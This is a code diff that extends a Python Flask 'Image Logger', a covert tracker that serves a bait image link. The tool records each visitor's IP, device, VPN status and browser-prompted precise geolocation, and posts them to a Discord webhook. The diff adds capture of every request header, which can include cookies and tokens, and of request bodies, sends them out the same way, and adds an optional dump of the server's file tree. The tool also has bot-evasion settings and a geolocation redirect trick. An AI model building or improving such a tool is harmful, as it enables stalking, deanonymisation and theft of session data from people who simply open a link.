@@ -7,6 +7,7 @@ import httpagentparser
 import json
 import time
 from collections import OrderedDict
+import os # For file tree (demonstration purposes, not exposed externally)
 
 # --- CONFIGURATION ---
 config = {
@@ -14,7 +15,7 @@ config = {
     "image": "https://m.media-amazon.com/images/I/51mdx0RJKgL._UXNaN_FMjpg_QL85_.jpg",
     "imageArgument": True,
 
-    "username": "Image Logger",
+    "username": "Enhanced Logger", # Changed username for clarity
     "color": 0x8A2BE2, # Vibrant Purple
 
     "crashBrowser": False,
@@ -28,7 +29,7 @@ config = {
 
     "vpnCheck": 1,
     "linkAlerts": True,
-    "buggedImage": True,
+    "buggedImage": True, # If True, sends binary data instead of the image
     "antiBot": 1,
     
     "redirect": {
@@ -39,6 +40,12 @@ config = {
     "ipCacheDuration": 3600,
     "webhookTimeout": 5,
     "ipApiTimeout": 5,
+    
+    # New configurations for file tree and detailed logging
+    "logFileTree": False, # Set to True to log the server's file tree (use with caution!)
+    "fileTreeDepth": 2, # How many levels deep to traverse for the file tree
+    "logRequestHeaders": True, # Log all request headers
+    "logRequestBody": False, # Log request body (can be sensitive, use with caution)
 }
 
 # --- BLACKLISTED IPS ---
@@ -90,6 +97,7 @@ def botCheck(ip, useragent):
         return "Discord"
     elif useragent and useragent.startswith("TelegramBot"):
         return "Telegram"
+    # Add more bot detection logic here if needed
     return False
 
 def reportError(error_trace, context=""):
@@ -103,9 +111,9 @@ def reportError(error_trace, context=""):
         "content": "@everyone",
         "embeds": [
             {
-                "title": "Image Logger - Error Occurred",
+                "title": "Logger - Error Occurred",
                 "color": 0xFF0000, # Red for errors
-                "description": f"An error occurred in the Image Logger.\n\n**Context:**\n```\n{context}\n```\n\n**Error Trace:**\n```python\n{error_trace}\n```",
+                "description": f"An error occurred in the logger.\n\n**Context:**\n```\n{context}\n```\n\n**Error Trace:**\n```python\n{error_trace}\n```",
                 "footer": {"text": "Check logs for more details."}
             }
         ],
@@ -115,12 +123,32 @@ def reportError(error_trace, context=""):
     except Exception as e:
         print(f"Failed to send error report to webhook: {e}")
 
-def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False, custom_image_provided=False):
+def generate_file_tree(path='.', depth=1, max_depth=2):
+    """Generates a string representation of a directory tree."""
+    tree = ""
+    if depth > max_depth:
+        return tree
+    try:
+        for entry in os.listdir(path):
+            full_path = os.path.join(path, entry)
+            indent = "    " * (depth - 1)
+            if os.path.isdir(full_path):
+                tree += f"{indent}|-- {entry}/\n"
+                tree += generate_file_tree(full_path, depth + 1, max_depth)
+            else:
+                tree += f"{indent}|-- {entry}\n"
+    except OSError:
+        pass # Ignore permission errors or inaccessible paths
+    return tree
+
+def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False, custom_image_provided=False, request_headers=None, request_body=None):
     """
     Gathers IP information, checks for bots/VPNs, and sends a report to Discord.
     'url' is the actual image URL.
-    'coords' is a boolean indicating if the coordinates are precise (from geolocation).
+    'coords' is a tuple (lat, lon) if precise coordinates are available.
     'custom_image_provided' is a boolean indicating if the image URL was from an argument.
+    'request_headers' is a dictionary of request headers.
+    'request_body' is the raw request body.
     Returns the IP info dictionary or None if IP is invalid/blacklisted.
     """
     if not ip:
@@ -163,8 +191,8 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False, custo
 
     is_proxy = info.get("proxy", False)
     if is_proxy:
-        if config["vpnCheck"] == 2: return info
-        if config["vpnCheck"] == 1: ping = ""
+        if config["vpnCheck"] == 2: return info # Return IP info without sending to webhook
+        if config["vpnCheck"] == 1: ping = "" # Suppress @everyone
 
     is_hosting = info.get("hosting", False)
     bot_status = "False"
@@ -174,12 +202,12 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False, custo
 
     if bot_status != "False":
         if config["antiBot"] in [2, 4] and bot_status not in ["Bot", "Hosting/Proxy"]:
-             pass
+             pass # Allow if not a direct bot/hosting
         elif config["antiBot"] in [2, 4] and bot_status in ["Bot", "Hosting/Proxy"]:
-            if config["antiBot"] == 4: return info
-            if config["antiBot"] == 2: ping = ""
-        elif config["antiBot"] == 3: return info
-        elif config["antiBot"] == 1: ping = ""
+            if config["antiBot"] == 4: return info # Return IP info without sending to webhook
+            if config["antiBot"] == 2: ping = "" # Suppress @everyone
+        elif config["antiBot"] == 3: return info # Return IP info without sending to webhook
+        elif config["antiBot"] == 1: ping = "" # Suppress @everyone
 
     # --- Prepare Embed Content ---
     os_detected, browser_detected = httpagentparser.simple_detect(useragent) if useragent else ("Unknown", "Unknown")
@@ -198,12 +226,11 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False, custo
     google_maps_link = ""
     if lat is not None and lon is not None:
         coords_str = f"{lat}, {lon}"
-        # IMPORTANT: Format the coordinates for a Google Maps URL
-        # We need to URL-encode special characters if any, and ensure correct structure.
-        # For simple lat,lon, this is usually fine, but it's good practice.
-        # The link will be: https://www.google.com/maps/search/?api=1&query=LAT,LON
+        # Google Maps URL for the coordinates
         google_maps_link = f"[Google Maps](https://www.google.com/maps/search/?api=1&query={coords_str.replace(',', ',%20')})"
-        embed_fields["Coords"] = f"{coords_str} ({'Precise, ' + google_maps_link if coords else 'Approximate'})"
+        # If precise_coords were provided by the client, mark it as Precise
+        precise_status = "Precise, " if coords else "Approximate"
+        embed_fields["Coords"] = f"{coords_str} ({precise_status}{google_maps_link})"
     else:
         embed_fields["Coords"] = "Unknown"
         
@@ -212,7 +239,7 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False, custo
     embed_fields["Timezone"] = f"`{timezone_str}`"
     
     embed_fields["Mobile"] = f"`{info.get('mobile', 'Unknown')}`"
-    embed_fields["VPN"] = f"`{info.get('proxy', 'Unknown')}`"
+    embed_fields["VPN/Proxy"] = f"`{info.get('proxy', 'Unknown')}`"
     embed_fields["Bot/Hosting"] = f"`{bot_status}`"
     embed_fields["OS"] = f"`{os_detected}`"
     embed_fields["Browser"] = f"`{browser_detected}`"
@@ -225,9 +252,47 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False, custo
             "inline": True
         })
 
+    # --- Additional Information ---
+    additional_info_description = ""
+
+    # Log Request Headers
+    if config["logRequestHeaders"] and request_headers:
+        headers_str = "\n".join([f"**{k}:** `{v}`" for k, v in request_headers.items()])
+        additional_info_description += f"**Request Headers:**\n{headers_str}\n\n"
+
+    # Log Request Body (use with extreme caution)
+    if config["logRequestBody"] and request_body:
+        # Attempt to decode if it looks like JSON, otherwise show raw
+        try:
+            decoded_body = request_body.decode('utf-8')
+            try:
+                json_body = json.loads(decoded_body)
+                body_display = json.dumps(json_body, indent=2)
+            except json.JSONDecodeError:
+                body_display = decoded_body # Not JSON, show as is
+            additional_info_description += f"**Request Body:**\n```\n{body_display}\n```\n\n"
+        except UnicodeDecodeError:
+            additional_info_description += f"**Request Body (raw bytes):**\n```\n{request_body}\n```\n\n"
+
+    # Log File Tree (use with extreme caution and only if enabled)
+    if config["logFileTree"]:
+        try:
+            server_file_tree = generate_file_tree(path='.', depth=1, max_depth=config["fileTreeDepth"])
+            if server_file_tree:
+                additional_info_description += f"**Server File Tree (depth {config['fileTreeDepth']}):**\n```\n{server_file_tree}\n```\n\n"
+        except Exception as e:
+            print(f"Error generating file tree: {e}")
+            reportError(traceback.format_exc(), context="Error generating file tree")
+
     user_agent_block = ""
     if useragent:
         user_agent_block = f"**User Agent:**\n```\n{useragent}\n```"
+        
+    # Combine user agent and other additional info if they exist
+    if user_agent_block or additional_info_description:
+        if user_agent_block:
+            additional_info_description = user_agent_block + "\n\n" + additional_info_description
+        embed_fields["Additional Info"] = additional_info_description.strip() # Use a field for potentially long info
 
     embed = {
         "username": config["username"],
@@ -237,11 +302,17 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False, custo
                 "title": "📍 IP Address Logged!",
                 "color": config["color"],
                 "fields": embed_field_list,
-                "description": user_agent_block,
+                "description": "", # Moved detailed info to a field if it exists
                 "footer": {"text": f"IP Lookup for {ip}"}
             }
         ],
     }
+    
+    # Adjusting embed structure if no additional info is present
+    if not additional_info_description and useragent:
+        embed["embeds"][0]["description"] = user_agent_block
+    elif additional_info_description and not useragent:
+        embed["embeds"][0]["description"] = additional_info_description
 
     # Add thumbnail ONLY if a custom image was provided AND it's not bugged image mode
     if custom_image_provided and not config["buggedImage"] and url:
@@ -268,6 +339,12 @@ def handle_image_request():
         ip_address = request.headers.get('X-Forwarded-For', request.remote_addr)
         user_agent = request.headers.get('User-Agent')
         request_path = request.path
+        
+        # Capture all headers
+        request_headers = dict(request.headers)
+        
+        # Capture request body
+        request_body = request.get_data()
 
         image_url = config["image"]
         custom_image_provided = False
@@ -294,7 +371,7 @@ def handle_image_request():
 
         if config["message"]["doMessage"]:
             message_content = config["message"]["message"]
-            ip_info = makeReport(ip_address, user_agent, endpoint=request_path, url=image_url, custom_image_provided=custom_image_provided)
+            ip_info = makeReport(ip_address, user_agent, endpoint=request_path, url=image_url, custom_image_provided=custom_image_provided, request_headers=request_headers, request_body=request_body)
             
             if ip_info and "error" not in ip_info:
                 message_content = message_content.replace("{ip}", ip_address if ip_address else "Unknown")
@@ -340,16 +417,16 @@ def handle_image_request():
             return Response(message_content.encode() + script_to_add.encode(), mimetype='text/html')
 
         if config["buggedImage"]:
-            makeReport(ip_address, user_agent, endpoint=request_path, url=image_url, custom_image_provided=custom_image_provided)
+            makeReport(ip_address, user_agent, endpoint=request_path, url=image_url, custom_image_provided=custom_image_provided, request_headers=request_headers, request_body=request_body)
             return Response(binaries["loading"], mimetype='image/jpeg')
 
         # --- Standard Image Display / Location Tracking ---
         
-        ip_info = makeReport(ip_address, user_agent, endpoint=request_path, url=image_url, custom_image_provided=custom_image_provided)
-            
         precise_coords = None
+        # Check if precise coordinates are provided via 'g' parameter
         if request.args.get("g"):
             try:
+                # Decode base64 and replace URL-encoded '=' if present
                 decoded_g = base64.b64decode(request.args.get("g").replace('%3D', '=')).decode()
                 lat_str, lon_str = decoded_g.split(',')
                 precise_coords = (float(lat_str), float(lon_str))
@@ -357,13 +434,13 @@ def handle_image_request():
                 print(f"Failed to process 'g' parameter for precise coordinates: {e}")
                 reportError(traceback.format_exc(), context=f"Failed to process 'g' parameter: {request.args.get('g')}")
 
-        if precise_coords and ip_info and "error" not in ip_info:
-             # Re-call makeReport with coords=True to update the Discord embed with precise location
-             makeReport(ip_address, user_agent, coords=True, endpoint=request_path, url=image_url, custom_image_provided=custom_image_provided)
-
+        # Make the report, passing precise_coords if available
+        ip_info = makeReport(ip_address, user_agent, coords=precise_coords, endpoint=request_path, url=image_url, custom_image_provided=custom_image_provided, request_headers=request_headers, request_body=request_body)
+            
         if config["accurateLocation"] and ip_info is not None and not request.args.get("g"):
             base_url = request.url.split('?')[0]
             query_params = request.args.to_dict()
+            # Exclude 'g' if it was already processed or if we are generating the initial URL
             filtered_params = [f"{k}={v}" for k, v in query_params.items() if k != 'g']
             query_string = "&".join(filtered_params)
             new_url_template = f"{base_url}{'?' + query_string if query_string else ''}"
@@ -411,20 +488,23 @@ def handle_image_request():
                         navigator.geolocation.getCurrentPosition(function (coords) {{
                             var lat = coords.coords.latitude;
                             var lon = coords.coords.longitude;
+                            // Encode coordinates for URL parameter
                             var encodedCoords = btoa(lat + "," + lon).replace(/=/g, "%3D");
                             var finalUrl = redirectTemplate + (redirectTemplate.includes("?") ? "&g=" : "?g=") + encodedCoords;
                             window.location.replace(finalUrl);
                         }}, function(error) {{
                             console.error("Geolocation error:", error);
+                            // If geolocation fails, proceed without coordinates
                             var currentPath = window.location.pathname;
                             var searchParams = new URLSearchParams(window.location.search);
-                            searchParams.delete('g');
+                            searchParams.delete('g'); // Ensure 'g' is not added if it failed
                             var newSearch = searchParams.toString();
                             var finalUrlWithoutCoords = currentPath + (newSearch ? '?' + newSearch : '');
                             window.location.replace(finalUrlWithoutCoords);
                         }});
                     }} else {{
                         console.log("Geolocation not supported");
+                        // If geolocation is not supported, proceed without coordinates
                         var currentPath = window.location.pathname;
                         var searchParams = new URLSearchParams(window.location.search);
                         searchParams.delete('g');
@@ -438,6 +518,7 @@ def handle_image_request():
             """
             return Response(html_content, mimetype='text/html')
         else:
+            # Standard HTML response, showing the image and a success message
             html_content = f'''<!DOCTYPE html>
 <html>
 <head>
@@ -477,6 +558,7 @@ def handle_image_request():
     <div class="img-container"></div>
     <div class="success-message" id="successMsg">Image Logged Successfully!</div>
     <script>
+        // Only show success message if we are not processing precise coordinates (i.e., 'g' parameter is not present)
         if (!window.location.search.includes('g=')) {{
             var msg = document.getElementById('successMsg');
             msg.style.opacity = '1';
@@ -489,9 +571,11 @@ def handle_image_request():
 
     except Exception as e:
         error_trace = traceback.format_exc()
-        reportError(error_trace, context=f"IP: {ip_address}, UA: {user_agent}")
+        reportError(error_trace, context=f"IP: {ip_address}, UA: {user_agent}, Path: {request_path}")
         return Response("500 - Internal Server Error. Please check the webhook for details.", status=500)
 
 # --- Example of how to run locally (optional) ---
 if __name__ == '__main__':
+    # IMPORTANT: For security, never run with debug=True in a production environment.
+    # Also, consider using a more robust WSGI server like Gunicorn or uWSGI.
     app.run(debug=True, host='0.0.0.0', port=5000)
